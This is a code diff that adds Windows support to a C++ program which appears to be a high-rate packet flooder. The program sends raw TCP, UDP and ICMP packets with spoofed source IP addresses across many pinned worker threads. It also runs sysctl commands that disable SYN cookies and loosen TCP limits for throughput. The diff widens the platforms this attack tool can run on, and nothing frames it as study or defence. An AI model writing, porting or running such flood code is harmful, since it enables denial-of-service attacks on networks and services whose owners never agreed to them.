@@ -2,6 +2,7 @@
 #include "app/thread_affinity.hpp"
 #include "common/constants.hpp"
 #include "common/types.hpp"
+#include "common/platform.hpp"
 #include "config/config.hpp"
 #include "packet/packet.hpp"
 #include "packet/packet_strategy.hpp"
@@ -15,9 +16,6 @@
 #include "transport/file_transport.hpp"
 #include "monitor/monitor_factory.hpp"
 #include "random/fast_random.hpp"
-#include "protocol/ipv4.hpp"
-#include "protocol/tcp.hpp"
-#include "protocol/checksum.hpp"
 
 #include <iostream>
 #include <thread>
@@ -25,11 +23,7 @@
 #include <atomic>
 #include <memory>
 #include <csignal>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <ifaddrs.h>
-#include <net/if.h>
+#include <cstring>
 
 namespace {
 
@@ -96,7 +90,8 @@ void generate_spoof_ips() {
     std::cout << "  Total spoof IPs: " << count << " (padded to " << pow2 << ")" << std::endl;
 }
 
-// Get real IP from network interface
+#if QEVORYX_PLATFORM_LINUX
+// Get real IP from network interface (Linux only)
 std::uint32_t get_real_ip(const std::string& interface_name) {
     struct ifaddrs* ifaddr = nullptr;
     std::uint32_t result = 0;
@@ -116,6 +111,12 @@ std::uint32_t get_real_ip(const std::string& interface_name) {
     freeifaddrs(ifaddr);
     return result;
 }
+#else
+// Windows: placeholder — real IP detection requires GetAdaptersAddresses
+std::uint32_t get_real_ip(const std::string& interface_name) {
+    return 0;
+}
+#endif
 
 } // anonymous namespace
 
@@ -128,16 +129,31 @@ int Application::run() {
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
 
+#if QEVORYX_PLATFORM_LINUX
     if (geteuid() != 0) {
         std::cerr << "  Must be run as root for raw sockets!" << std::endl;
         return 1;
     }
+#endif
+
+#if QEVORYX_PLATFORM_WINDOWS
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        std::cerr << "  WSAStartup failed!" << std::endl;
+        return 1;
+    }
+#endif
 
     initialize();
     create_workers();
     start_monitor();
     wait_for_shutdown();
     shutdown();
+
+#if QEVORYX_PLATFORM_WINDOWS
+    WSACleanup();
+#endif
+
     return 0;
 }
 
@@ -158,7 +174,8 @@ void Application::initialize() {
         }
     }
 
-    // Kernel tuning
+#if QEVORYX_PLATFORM_LINUX
+    // Kernel tuning (Linux only)
     system("sysctl -w net.ipv4.tcp_tw_reuse=1 > /dev/null 2>&1");
     system("sysctl -w net.ipv4.tcp_fin_timeout=5 > /dev/null 2>&1");
     system("sysctl -w net.ipv4.tcp_timestamps=0 > /dev/null 2>&1");
@@ -170,6 +187,9 @@ void Application::initialize() {
     system("sysctl -w net.ipv4.tcp_max_syn_backlog=500000 > /dev/null 2>&1");
     system("sysctl -w net.ipv4.tcp_syncookies=0 > /dev/null 2>&1");
     system("ulimit -n 2000000 > /dev/null 2>&1");
+#else
+    // Windows: set send buffer size via setsockopt (done per-socket below)
+#endif
 }
 
 void Application::create_workers() {
@@ -195,26 +215,27 @@ void Application::create_workers() {
     for (std::uint32_t i = 0; i < config_.worker_count; i++) {
         packet::PacketStrategy* strat = nullptr;
         if (config_.packet_mode == config::PacketMode::Mixed) {
-            // Round-robin across TCP, UDP, ICMP
             int type = i % 3;
             if (type == 0) strat = tcp_strategy.get();
             else if (type == 1) strat = udp_strategy.get();
             else strat = icmp_strategy.get();
         } else {
             strat = packet::create_strategy(config_.packet_mode).release();
-            // Note: for non-mixed, we create per-worker — but this is called once
-            // Actually we should pre-create. Let me fix this.
         }
 
         workers.emplace_back([this, strat, i, real_ip]() {
             app::pin_current_thread(i);
 
+#if QEVORYX_PLATFORM_WINDOWS
+            int sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
+#else
             int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+#endif
             if (sock < 0) { g_threads_ready++; return; }
 
             int one = 1;
-            setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &common::SEND_BUF_SIZE, sizeof(common::SEND_BUF_SIZE));
+            setsockopt(sock, IPPROTO_IP, IP_HDRINCL, reinterpret_cast<const char*>(&one), sizeof(one));
+            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, reinterpret_cast<const char*>(&common::SEND_BUF_SIZE), sizeof(common::SEND_BUF_SIZE));
 
             g_threads_ready++;
 
@@ -236,7 +257,6 @@ void Application::create_workers() {
                 if (sent && !config_.use_spoof_ips && real_ip != 0) {
                     auto* iph = reinterpret_cast<protocol::IPv4Header*>(buffer.ptr());
                     iph->source = real_ip;
-                    // Recompute TCP checksum if it's a TCP packet
                     if (iph->protocol == protocol::IPPROTO_VALUE_TCP) {
                         auto* tcph = reinterpret_cast<protocol::TcpHeader*>(buffer.ptr() + protocol::IPv4_HEADER_SIZE);
                         tcph->checksum = 0;
@@ -248,7 +268,7 @@ void Application::create_workers() {
                 }
 
                 if (sent) {
-                    if (sendto(sock, buffer.ptr(), buffer.size, 0,
+                    if (sendto(sock, reinterpret_cast<const char*>(buffer.ptr()), buffer.size, 0,
                                reinterpret_cast<struct sockaddr*>(&sin), sizeof(sin)) > 0) {
                         g_total_packets++;
                         local_pps++;
@@ -261,7 +281,7 @@ void Application::create_workers() {
                 }
             }
 
-            close(sock);
+            QEVORYX_CLOSESOCK(sock);
         });
 
         if (i % 100 == 0) { std::cout << "."; std::cout.flush(); }
